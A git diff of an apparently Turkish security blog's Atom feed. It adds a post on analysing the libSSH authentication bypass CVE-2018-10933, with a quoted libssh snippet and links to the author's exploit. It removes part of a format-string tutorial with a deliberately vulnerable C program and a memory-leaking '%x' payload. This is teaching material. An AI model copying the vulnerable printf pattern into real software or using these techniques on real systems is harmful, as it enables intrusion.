@@ -1,4 +1,208 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://192.168.254.251:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://192.168.254.251:4000/" rel="alternate" type="text/html" /><updated>2019-05-20T22:55:37+03:00</updated><id>http://192.168.254.251:4000/</id><title type="html">Daily Security</title><subtitle>In this blog we're going to solve CTF's &amp; Write Some Software's.My goal is redirect my little knowledge to other people.</subtitle><entry><title type="html">Malware Analysis - Dynamic Analysis (Part 3)</title><link href="http://192.168.254.251:4000/2019/05/20/malware-analysis-part-3.html" rel="alternate" type="text/html" title="Malware Analysis - Dynamic Analysis (Part 3)" /><published>2019-05-20T00:00:00+03:00</published><updated>2019-05-20T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/20/malware-analysis-part-3</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/20/malware-analysis-part-3.html">&lt;h1 id=&quot;malware-analysis---dynamic-analysis-part-3&quot;&gt;Malware Analysis - Dynamic Analysis (Part 3)&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://192.168.254.251:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://192.168.254.251:4000/" rel="alternate" type="text/html" /><updated>2019-05-24T21:40:18+03:00</updated><id>http://192.168.254.251:4000/</id><title type="html">Daily Security</title><subtitle>In this blog we're going to solve CTF's &amp; Write Some Software's.My goal is redirect my little knowledge to other people.</subtitle><entry><title type="html">CVE Analizi ve Exploit Development</title><link href="http://192.168.254.251:4000/2019/05/24/cve-analizi-ve-exploit-development.html" rel="alternate" type="text/html" title="CVE Analizi ve Exploit Development" /><published>2019-05-24T00:00:00+03:00</published><updated>2019-05-24T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/24/cve-analizi-ve-exploit-development</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/24/cve-analizi-ve-exploit-development.html">&lt;h1 id=&quot;cve-analizi-ve-exploit-development&quot;&gt;CVE Analizi ve Exploit Development&lt;/h1&gt;
+
+&lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;CVE Analizi&lt;/strong&gt; ve &lt;strong&gt;Exploit Development&lt;/strong&gt; isimli yazıma hoşgeldiniz.&lt;/p&gt;
+
+&lt;p&gt;Bu yazımda size &lt;strong&gt;CVE&lt;/strong&gt;‘nin ne olduğundan bunun analizinin nasıl yapılacağından ve bu &lt;strong&gt;CVE&lt;/strong&gt;‘lere yönelik &lt;strong&gt;Exploit&lt;/strong&gt;‘in nasıl geliştirilmesi gerektiğinden bahsedeceğim.&lt;/p&gt;
+
+&lt;p&gt;Yazıma geçmeden önce sizlere kısa bir süre önce piyasayı sallayan &lt;strong&gt;libSSH&lt;/strong&gt;‘den ve bunun ilk &lt;strong&gt;Exploit&lt;/strong&gt;‘ini nasıl yazdığımdan bahsedeceğim.&lt;/p&gt;
+
+&lt;h1 id=&quot;libssh-nedir-&quot;&gt;libSSH Nedir ?&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;libSSH&lt;/strong&gt; basit bir şekilde &lt;strong&gt;C&lt;/strong&gt; ile yazılmış bir kütüphanedir ve bu kütüphane &lt;strong&gt;Protocol&lt;/strong&gt; olarak şuanda &lt;strong&gt;SSHv2&lt;/strong&gt; protokolünü kullanmaktadır.&lt;/p&gt;
+
+&lt;p&gt;Sunucular bu kütüphaneyi kullanarak &lt;strong&gt;Client&lt;/strong&gt; ve &lt;strong&gt;Server&lt;/strong&gt; tarafında &lt;strong&gt;SSH&lt;/strong&gt; bağlantıları oluşturmaktadır.&lt;/p&gt;
+
+&lt;h1 id=&quot;piyasayı-sallayan-libssh-zafiyeti&quot;&gt;Piyasayı sallayan libSSH zafiyeti&lt;/h1&gt;
+
+&lt;p&gt;Çok kısa bir süre öncesinde internet üzerinde &lt;strong&gt;Peter Winter-Smith&lt;/strong&gt; tarafından ortaya çıkarılmış bir zafiyettir bu.&lt;/p&gt;
+
+&lt;p&gt;Bu zafiyetin içeriğini basit bir şekilde anlatacak olursam şayet :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/JUzxiw.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Basit bir şekilde &lt;strong&gt;Sandviç&lt;/strong&gt; istediğimizde &lt;strong&gt;Hayır&lt;/strong&gt; deniliyor şayet &lt;strong&gt;Sandviç Success&lt;/strong&gt; dediğimizde şartsız bir şekilde karşıdaki hemen yapayım efendim diyor.&lt;/p&gt;
+
+&lt;p&gt;Yani daha da teknik bir şekilde açıklarsam bir &lt;strong&gt;Sunucu&lt;/strong&gt; içerisine &lt;strong&gt;Kullanıcı Adı&lt;/strong&gt; ve &lt;strong&gt;Şifre&lt;/strong&gt; vermeden sadece karşıya &lt;strong&gt;MSG_USERAUTH_SUCCESS&lt;/strong&gt;  diyerek girebiliyoruz.&lt;/p&gt;
+
+&lt;p&gt;Daha da basit şekilde &lt;strong&gt;libSSH&lt;/strong&gt;‘in &lt;strong&gt;0.6&lt;/strong&gt; versiyonun sonrasını kullanan tüm &lt;strong&gt;Sunucu&lt;/strong&gt;‘lara kullanıcı bilgilerini vermeden giriş yapabiliyorduk.&lt;/p&gt;
+
+&lt;p&gt;Ve buda piyasada çok büyük bir yankı oluşturdu.&lt;/p&gt;
+
+&lt;h1 id=&quot;zafiyetin-ortaya-çıktığını-nasıl-bulup-exploitini-buna-yazdım-&quot;&gt;Zafiyetin ortaya çıktığını nasıl bulup exploit’ini buna yazdım ?&lt;/h1&gt;
+
+&lt;p&gt;Bu &lt;strong&gt;zafiyet&lt;/strong&gt;‘i her saniye yenilenen &lt;strong&gt;CVE&lt;/strong&gt; listesini incelerken aniden gördüm.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2018-10933&quot;&gt;libSSH CVE&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Ve &lt;strong&gt;libSSH&lt;/strong&gt;‘te bulunan zafiyetin ne olduğuna dair bir açıklama bulunduğundan hemen onu okumaya koyuldum.&lt;/p&gt;
+
+&lt;p&gt;Açıklama :&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;A vulnerability was found in libssh’s server-side state machine before versions 0.7.6 and 0.8.4. A malicious client could create channels without first performing authentication, resulting in unauthorized access.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Ve hızlı bir şekilde &lt;strong&gt;libSSH&lt;/strong&gt; kütüphanesinin kodlarını incelemeye başladım.&lt;/p&gt;
+
+&lt;p&gt;Bu kodlar içinde şu kısım çok ilgimi çekti :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/zfy1mC.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Çünkü bu kısımda geçen diyalog basit bir şekilde şöyle :&lt;/p&gt;
+
+&lt;p&gt;Eğer oturum içerisinde &lt;strong&gt;SSH_AUTH_STATE_SUCCESS&lt;/strong&gt;  mevcut ise &lt;strong&gt;Kullanıcı Adı&lt;/strong&gt; ve &lt;strong&gt;Şifre&lt;/strong&gt; istemeden girişi gerçekleştir.&lt;/p&gt;
+
+&lt;p&gt;Bende bunu anladıktan sonra bir &lt;strong&gt;Exploit&lt;/strong&gt; geliştirdim. Karşıda &lt;strong&gt;libSSH&lt;/strong&gt; kullanan &lt;strong&gt;Sunucu&lt;/strong&gt;‘da &lt;strong&gt;Komut&lt;/strong&gt; çalıştırmayı basitleştirmek için.&lt;/p&gt;
+
+&lt;p&gt;Bu yazdığım &lt;strong&gt;Exploit&lt;/strong&gt; twitterde çoğu yerde paylaşıldı ve &lt;strong&gt;Github&lt;/strong&gt; içerisinde baya bir &lt;strong&gt;Star&lt;/strong&gt; aldı.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Github&lt;/strong&gt;‘ta paylaştığım bu &lt;strong&gt;Exploit&lt;/strong&gt;‘in linki : &lt;a href=&quot;https://github.com/blacknbunny/libSSH-Authentication-Bypass&quot;&gt;libSSH Exploit Github&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Hatta twitterde &lt;strong&gt;16 yaşındaki dayanç soyadlı’nın libSSH için geliştirdiği exploit&lt;/strong&gt; diye paylaşan bir çok ingiliz arkadaş gördüm bunlardan biri :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/5G8VJu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Exploit&lt;/strong&gt;‘i yazdıktan sonra &lt;strong&gt;Shodan&lt;/strong&gt; içerisinden baktığımda twitterde ne kadar &lt;strong&gt;6500&lt;/strong&gt; tane potansiyel olarak hacklenmiş sistem olduğunu görsemde &lt;strong&gt;Shodan&lt;/strong&gt;‘da bu sayı &lt;strong&gt;50,000&lt;/strong&gt;‘i geçmişti.&lt;/p&gt;
+
+&lt;p&gt;Hatta &lt;strong&gt;Liveoverflow&lt;/strong&gt; kanalının sahibine bu &lt;strong&gt;Zafiyet&lt;/strong&gt; hakkında video çekecekmisin sorusunu sorduğumda &lt;strong&gt;Twitter&lt;/strong&gt;‘den verdiği cevap şu oldu :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/Du3nof.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ve yazdığım &lt;strong&gt;Exploit&lt;/strong&gt;‘in ne kadarda büyük bir sonuca ulaştığını gördüm bu şekilde tabi yukarıda anlattığım şeyler bir kısmı.&lt;/p&gt;
+
+&lt;p&gt;Bu yazdığım &lt;strong&gt;Exploit&lt;/strong&gt; bir çok &lt;strong&gt;CVE&lt;/strong&gt; listesinde yayımlanmış bulunmaktadır :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/Hzoku8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aynı zamanda &lt;strong&gt;Exploti-DB&lt;/strong&gt; içerisinde de yayınlandı : &lt;a href=&quot;https://www.exploit-db.com/exploits/45638&quot;&gt;libSSH Exploit&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Şimdi gelelim bir &lt;strong&gt;CVE&lt;/strong&gt;‘nin ne olduğuna bunun nasıl analizinin yapılacağına ve bunun için &lt;strong&gt;Exploit&lt;/strong&gt;‘in nasıl geliştirileceğine.&lt;/p&gt;
+
+&lt;h1 id=&quot;cve-nedir&quot;&gt;CVE Nedir&lt;/h1&gt;
+
+&lt;p&gt;&lt;strong&gt;CVE&lt;/strong&gt; bilgi güvenliği zafiyetlerinin bir listesidir.&lt;/p&gt;
+
+&lt;p&gt;Daha basit bir şekilde bir &lt;strong&gt;Zafiyet&lt;/strong&gt;‘in açıklandığı ve var ise şayet &lt;strong&gt;Exploit&lt;/strong&gt;‘lerinin bulunduğu bir kayıttır.&lt;/p&gt;
+
+&lt;p&gt;Bir kaç tane &lt;strong&gt;CVE&lt;/strong&gt; paylaşım sitesi :&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cve/&quot;&gt;CVE Mitre&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/&quot;&gt;CVE NVD&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.cvedetails.com/bugtraq-list/&quot;&gt;CVE details&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;cve-analizi&quot;&gt;CVE Analizi&lt;/h1&gt;
+
+&lt;p&gt;Öncelikle bir &lt;strong&gt;CVE&lt;/strong&gt; bulalım.&lt;/p&gt;
+
+&lt;p&gt;Ben &lt;strong&gt;libSSH&lt;/strong&gt;‘den başladığım için aynı şekilde devam edeceğim.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/90kjVo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu &lt;strong&gt;CVE&lt;/strong&gt; listesi içerisinde benim &lt;strong&gt;Exploit&lt;/strong&gt;‘ini yazdığım &lt;strong&gt;CVE&lt;/strong&gt;‘nin &lt;strong&gt;ID&lt;/strong&gt;‘si &lt;strong&gt;CVE-2018-10933&lt;/strong&gt; basit bir şekilde daha bu &lt;strong&gt;CVE&lt;/strong&gt;‘nin içerisine girmeden bu &lt;strong&gt;Zafiyet&lt;/strong&gt;‘in ne olduğu açıklanıyor.&lt;/p&gt;
+
+&lt;p&gt;Bu &lt;strong&gt;CVE&lt;/strong&gt; kaydına girip benimle ilerlemek isteyenler için link : &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2018-10933/&quot;&gt;CVE-2018-10933&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Şimdi bu &lt;strong&gt;CVE&lt;/strong&gt;‘nin içerisine girdikten sonra içerisinde &lt;strong&gt;CVE&lt;/strong&gt;‘nin &lt;strong&gt;CVSS Score&lt;/strong&gt;‘unu görebiliriz yani ne kadar &lt;strong&gt;Kritik&lt;/strong&gt; olduğunu.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/R9izHT.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aynı zamanda bu &lt;strong&gt;Zafiyet&lt;/strong&gt;‘ten etkilenen &lt;strong&gt;Product&lt;/strong&gt;‘larıda görebiliyoruz :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/7SUpDm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu &lt;strong&gt;Zafiyet&lt;/strong&gt; için bulunan &lt;strong&gt;Referans&lt;/strong&gt;‘larıda görebiliyoruz ayrıca.&lt;/p&gt;
+
+&lt;p&gt;Bu &lt;strong&gt;Referans&lt;/strong&gt;‘lar içerisinde &lt;strong&gt;Zafiyet&lt;/strong&gt;‘in yazılmış ise &lt;strong&gt;Exploit&lt;/strong&gt;‘ide bulunur.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/g6sR9C.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Burada bulunan &lt;strong&gt;Exploit-DB&lt;/strong&gt; linki benim size başta bahsettiğim kendi yazdığım &lt;strong&gt;Exploit&lt;/strong&gt;‘tir.&lt;/p&gt;
+
+&lt;p&gt;Şimdi bu &lt;strong&gt;Exploit&lt;/strong&gt;‘i nasıl geliştirdiğime yani bir &lt;strong&gt;CVE&lt;/strong&gt;‘nin &lt;strong&gt;Analiz&lt;/strong&gt;‘i sonrası o &lt;strong&gt;CVE&lt;/strong&gt; için &lt;strong&gt;Exploit&lt;/strong&gt;‘in nasıl geliştirileceğinden bahsedeceğim.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploit-development&quot;&gt;Exploit Development&lt;/h1&gt;
+
+&lt;p&gt;Daha derine inmeden önce size basit bir şekilde bir &lt;strong&gt;Exploit&lt;/strong&gt;‘in ne olduğundan ve nasıl geliştirilebileceğinden bahsetmek istiyorum.&lt;/p&gt;
+
+&lt;h4 id=&quot;exploit-nedir-&quot;&gt;Exploit nedir ?&lt;/h4&gt;
+
+&lt;p&gt;Bir &lt;strong&gt;Exploit&lt;/strong&gt; genellikle &lt;strong&gt;Zafiyet&lt;/strong&gt; içeren bir kodu sömürmek için geliştirilen bir kod parçasıdır.&lt;/p&gt;
+
+&lt;h4 id=&quot;exploit-development-nedir-&quot;&gt;Exploit Development Nedir ?&lt;/h4&gt;
+
+&lt;p&gt;&lt;strong&gt;Zafiyet&lt;/strong&gt; içerilen kodu &lt;strong&gt;Analiz&lt;/strong&gt; ettikten sonra bu kodu sömürge için kullanılacak kodu geliştirmektir.&lt;/p&gt;
+
+&lt;p&gt;Daha da açarsam konuyu &lt;strong&gt;Exploit&lt;/strong&gt; geliştirmek için bu sömürge kod parçasını yazacağınız &lt;strong&gt;Zafiyeti&lt;/strong&gt; ve bu &lt;strong&gt;Zafiyet&lt;/strong&gt;‘in &lt;strong&gt;Kod&lt;/strong&gt;‘unu kavramanız gerekmektedir.&lt;/p&gt;
+
+&lt;h4 id=&quot;ben-libssh-exploitini-nasıl-geliştirdim&quot;&gt;Ben libSSH Exploit’ini nasıl geliştirdim&lt;/h4&gt;
+
+&lt;p&gt;Dediğim gibi &lt;strong&gt;CVE&lt;/strong&gt; listelerinde gezerken denk geldim ve &lt;strong&gt;libSSH&lt;/strong&gt; bir kütüphane olduğundan &lt;strong&gt;Authentication&lt;/strong&gt; yapılan kısımları incelemeye başladım bu kütüphane içerisinde.&lt;/p&gt;
+
+&lt;p&gt;Yani gerçekleştirilecek oturum yani &lt;strong&gt;Session&lt;/strong&gt; için kütüphane içerisinde var olan &lt;strong&gt;Giriş&lt;/strong&gt;, &lt;strong&gt;Çıkış&lt;/strong&gt; ve &lt;strong&gt;Kontrol&lt;/strong&gt; kodlarını incelemeye başladım.&lt;/p&gt;
+
+&lt;p&gt;Ve bu kodlar içerisinde baştada resmini verdiğim &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘una denk geldim.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;libSSH&lt;/strong&gt; içerisinde bulunan şu küçük &lt;strong&gt;Kod Parça&lt;/strong&gt;‘sı benim gerekli olan &lt;strong&gt;Exploit&lt;/strong&gt;‘i geliştirmemi sağladı diyebilirim :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SSH_PACKET_CALLBACK(ssh_packet_userauth_success)
+  (void)packet;
+  (void)type;
+  (void)user;
+
+  SSH_LOG(SSH_LOG_DEBUG, &quot;Authentication successful&quot;);
+  SSH_LOG(SSH_LOG_TRACE, &quot;Received SSH_USERAUTH_SUCCESS&quot;);
+
+  session-&amp;gt;auth.state = SSH_AUTH_STATE_SUCCESS;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Burada gördüğünüz &lt;strong&gt;Kaynak Kod&lt;/strong&gt; basit bir şekilde eğer dışarıdan &lt;strong&gt;libSSH&lt;/strong&gt; çalıştırılan sunucu içerisinde &lt;strong&gt;SSH_AUTH_STATE_SUCCESS&lt;/strong&gt; byte’ı eklenirse aşşağıdaki kodu çalıştır diyor :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session-&amp;gt; auth.state = SSH_AUTH_STATE_SUCCESS;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ve bu &lt;strong&gt;Kod&lt;/strong&gt; ise basit bir şekilde &lt;strong&gt;session&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;auth&lt;/strong&gt; objesindeki &lt;strong&gt;state&lt;/strong&gt; değişkenine &lt;strong&gt;SSH_AUTH_STATE_SUCCESS&lt;/strong&gt; byte’ını ekliyor.&lt;/p&gt;
+
+&lt;p&gt;Buda demek ki sunucuya gönderdiğimiz &lt;strong&gt;SSH_AUTH_STATE_SUCCESS&lt;/strong&gt; byte’ı bizi sunucu’ya &lt;strong&gt;Kullanıcı Adı&lt;/strong&gt; ve &lt;strong&gt;Şifre&lt;/strong&gt; vermeden sokabilecek.&lt;/p&gt;
+
+&lt;p&gt;Bende &lt;strong&gt;CVE&lt;/strong&gt;‘de ki açıklamayı okuduktan sonra &lt;strong&gt;libSSH&lt;/strong&gt; içerisindeki &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘ları inceledikten sonra &lt;strong&gt;Exploit&lt;/strong&gt;‘i geliştirmek için &lt;strong&gt;Zafiyet&lt;/strong&gt;‘i bu şekilde kavradım.&lt;/p&gt;
+
+&lt;p&gt;Ve sömürge kodunu geliştirdim.&lt;/p&gt;
+
+&lt;p&gt;Şimdi daha da derine inip sizlerin nasıl &lt;strong&gt;Exploit&lt;/strong&gt; geliştirebileceğinden bahsedeyim.&lt;/p&gt;
+&lt;h1 id=&quot;exploit-development-1&quot;&gt;Exploit Development&lt;/h1&gt;
+
+&lt;p&gt;Öncelikle &lt;strong&gt;Kaynak Kod&lt;/strong&gt; okumaya aşina olmanız gerek.&lt;/p&gt;
+
+&lt;p&gt;Çok çok önceden var olan bir söz vardır.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Bir hacker programcıdan daha iyi programlaya bildiği ve bunu tersine kullana bildiği için hackerdir.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Yani basit bir şekilde sizlerin &lt;strong&gt;Sömürge Kod&lt;/strong&gt;‘unu geliştirmeniz için &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘u okumaya aşina olmanız gerek.&lt;/p&gt;
+
+&lt;p&gt;Kendi &lt;strong&gt;Exploit&lt;/strong&gt;‘lerinizi geliştirmek için &lt;strong&gt;Zafiyet&lt;/strong&gt;‘i illaki sizin bulmanız gerekmez.&lt;/p&gt;
+
+&lt;p&gt;Yalnız bir hedef’e &lt;strong&gt;Saldırmadan&lt;/strong&gt; önce o hedefi &lt;strong&gt;Tanımanız&lt;/strong&gt; gereklidir.&lt;/p&gt;
+
+&lt;p&gt;Bir çok&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;FTP&lt;/li&gt;
+  &lt;li&gt;SMTP&lt;/li&gt;
+  &lt;li&gt;SSH&lt;/li&gt;
+  &lt;li&gt;HTTP&lt;/li&gt;
+  &lt;li&gt;vs…&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Exploit&lt;/strong&gt; kodu görebiliyorum internet’te yalnız bu &lt;strong&gt;Exploit&lt;/strong&gt; geliştirenlerin 0’dan bir &lt;strong&gt;FTP&lt;/strong&gt; ya da &lt;strong&gt;SMTP&lt;/strong&gt; vs… &lt;strong&gt;Server&lt;/strong&gt;‘i ya da &lt;strong&gt;Client&lt;/strong&gt;‘i geliştirebileni &lt;strong&gt;%5&lt;/strong&gt;‘lik hisse.&lt;/p&gt;
+
+&lt;p&gt;Dolayısı ile &lt;strong&gt;Zafiyet&lt;/strong&gt;‘i tanımak ve buna gerekli &lt;strong&gt;Exploit&lt;/strong&gt;‘i geliştirebilmeniz için &lt;strong&gt;Teknoloji&lt;/strong&gt;‘yi kendiniz yazmış gibi tanımanız gerekmekte.&lt;/p&gt;
+
+&lt;h1 id=&quot;the-end&quot;&gt;THE END&lt;/h1&gt;
+&lt;p&gt;Bu yazımızında sonuna geldik.&lt;/p&gt;
+
+&lt;p&gt;Bir &lt;strong&gt;CVE&lt;/strong&gt;‘nin ne olduğundan ve bunun &lt;strong&gt;Analizi&lt;/strong&gt;‘nin nasıl yapılacağından aynı zamanda &lt;strong&gt;Zafiyet&lt;/strong&gt;‘ler için nasıl &lt;strong&gt;Sömürge Kodu&lt;/strong&gt; yani &lt;strong&gt;Exploit&lt;/strong&gt; geliştirilebileceğinden bahsettim.&lt;/p&gt;
+
+&lt;p&gt;Sorularınız mevcut ise : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;Twitter&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">CVE Analizi ve Exploit Development</summary></entry><entry><title type="html">Malware Analysis - Dynamic Analysis (Part 3)</title><link href="http://192.168.254.251:4000/2019/05/20/malware-analysis-part-3.html" rel="alternate" type="text/html" title="Malware Analysis - Dynamic Analysis (Part 3)" /><published>2019-05-20T00:00:00+03:00</published><updated>2019-05-20T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/20/malware-analysis-part-3</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/20/malware-analysis-part-3.html">&lt;h1 id=&quot;malware-analysis---dynamic-analysis-part-3&quot;&gt;Malware Analysis - Dynamic Analysis (Part 3)&lt;/h1&gt;
 &lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Malware Analizi&lt;/strong&gt; serimin üçüncü part’ına hoşgeldiniz.&lt;/p&gt;
 
 &lt;p&gt;Bu partımızda artık canlı bir &lt;strong&gt;Malware&lt;/strong&gt; üzerinde işlemler gerçekleştireceğiz.&lt;/p&gt;
@@ -1776,141 +1980,4 @@ Aborted (core dumped)
 
 &lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=w4tioqtw2pM&quot;&gt;PE Code Injection&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;Kısa bilgi : Video kayıdına aldığım bu konu basit şekilde PE(Portable Executable) çalıştırılabilir (Win 32/64 bit) .exe dosyalarının biraz analizini &amp;amp; tam anlamı ilede içerisine kod enjeksiyonunun(Code Injection) yapılmasını anlattım. İyi izlemeler.&lt;/p&gt;</content><author><name></name></author><summary type="html">Paylaştığım video da blogum da yayınlıyacağım demiştim fakat fikrimi değiştirdim çünkü video da herşeyi en son detayına kadar anlatmışım ve 25 dakika sürmüş. Eğer bu blog kısmında da anlatmaya çalışırsam zilyon sayfa yazı çıkar. O yüzden direk youtube linkini paslıyorum izlemek isteyenler için. :</summary></entry><entry><title type="html">Format String Attack</title><link href="http://192.168.254.251:4000/2018/10/17/format-string-attack.html" rel="alternate" type="text/html" title="Format String Attack" /><published>2018-10-17T00:00:00+03:00</published><updated>2018-10-17T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2018/10/17/format-string-attack</id><content type="html" xml:base="http://192.168.254.251:4000/2018/10/17/format-string-attack.html">&lt;h1 id=&quot;format-string-nedir-&quot;&gt;&lt;strong&gt;Format String Nedir ?&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;&lt;em&gt;Format string metin ve format parametreleri tutan bir ASCII’dir. Çoğu programlama dilinde de görebiliriz ki herhangi bir metin yazacağımız zaman bu metini  direk yazımızın içine değilde bir değişkene aktarırız, ve bu değişkenide yazımızın içerisinde format stringler aracılığıyla kullanırız.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;Format Stringleri içeren tablo:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/4ZCa5cF.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;format-string-zafiyetini-içeren-fonksiyonlar&quot;&gt;&lt;strong&gt;Format string zafiyetini içeren fonksiyonlar&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gzbKC2S.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;örnek-format-string-saldırısı&quot;&gt;&lt;strong&gt;Örnek format string saldırısı&lt;/strong&gt;&lt;/h1&gt;
-
-&lt;p&gt;**Format String zafiyetini sömürmek için kullanacağımız kodumuz: **&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-
-int hedef;
-
-
-int main(int argc, char *argv[]){
-
-		char buffer[64];
-		
-		strcpy(buffer, argv[1]);
-		
-		printf(&quot;Girdiniz: &quot;);
-		
-		printf(buffer);
-		
-		if(hedef){
-		   printf(&quot;Hedef değişkenini düzenlendi.&quot;);
-		}
-		printf(&quot;\n&quot;);
-
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;Derlemek(compile) ve Çalıştırmak(run) için:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc vuln.c -o vuln
-
-./vuln &quot;Merhaba Dünya&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;strong&gt;Zafiyeti kullanarak program içerisinde Bellek Sızıntısı(Memory Leak) yaratmak.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./vuln &quot;0x%x 0x%x 0x%x 0x%x&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Yukarıda kullanılan “0x%x” ler baştaki “Format Stringleri içeren tablo”sundan da görebileceğiniz gibi hafıza(memory) içerisindeki diğer adresleri format string zafiyetini sömürerek yazıyoruz. Bellek sızıntısı bu şekilde oluşmuş oluyor. Buffer’e kopyaladığımız 1. argümanımız &lt;strong&gt;printf&lt;/strong&gt; fonksiyonu tarafından kullanılmaya çalışıldığında buffere verdiğimiz “0x%x”ler çalışacak ve printf fonksiyonunun format string zafiyetinden yararlanarak bellekteki diğer adresleri gözlemleyebildik.&lt;/p&gt;
-
-&lt;p&gt;Ve sonucunda çıktımız(output) şu şekilde gelecektir :&lt;/p&gt;
-
